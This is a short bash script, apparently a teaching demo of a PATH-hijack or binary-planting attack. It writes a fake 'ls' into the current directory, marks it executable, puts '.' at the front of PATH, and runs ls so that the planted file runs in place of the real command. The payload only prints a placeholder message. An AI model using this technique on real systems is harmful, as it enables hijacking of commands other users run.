#!/usr/bin/bash

# Basic path hijack demo script that uses binary planting attack method.

echo -e '#!/bin/bash\necho "MALICIOUS CODE THAT IS EXECUTED"' > ./ls
chmod +x ./ls

export PATH=.:$PATH
ls




